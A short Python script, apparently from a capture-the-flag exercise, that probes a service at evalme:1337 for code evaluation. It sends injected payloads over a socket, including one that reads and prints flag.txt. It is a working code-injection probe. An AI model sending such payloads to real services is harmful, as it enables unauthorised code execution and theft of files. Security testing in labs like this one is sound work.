"""Test whether evalme:1337 evaluates submitted answers (side-effect probe).
Sends only read-only probes; never runs the injected extract.sh payload."""
import socket, re, time

HOST, PORT = "evalme", 1337

def session(payloads, seconds=6.0):
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(seconds)
    f = s.makefile("rwb", buffering=0)
    out = []
    # drain banner + first problem
    for _ in range(6):
        try:
            line = f.readline()
        except socket.timeout:
            break
        if not line:
            break
        t = line.decode(errors="replace").rstrip("\n")
        out.append("S: " + t)
        if re.fullmatch(r"\s*-?\d+\s*[+\-*/]\s*-?\d+\s*", t):
            break
    for p in payloads:
        out.append("C: " + p)
        try:
            f.write((p + "\n").encode())
        except Exception as e:
            out.append("write-error: %r" % (e,))
            break
        # read a couple of lines of response
        for _ in range(3):
            try:
                line = f.readline()
            except socket.timeout:
                out.append("<timeout>")
                break
            if not line:
                out.append("<eof>")
                break
            out.append("S: " + line.decode(errors="replace").rstrip("\n"))
            break
    try:
        s.close()
    except Exception:
        pass
    return out

tests = {
    "print side-effect": ['print("HELLO_FROM_EVAL")'],
    "read flag via print": ['print(open("flag.txt").read())'],
}
for name, payloads in tests.items():
    print("###", name)
    for line in session(payloads):
        print("   ", line)
    print()
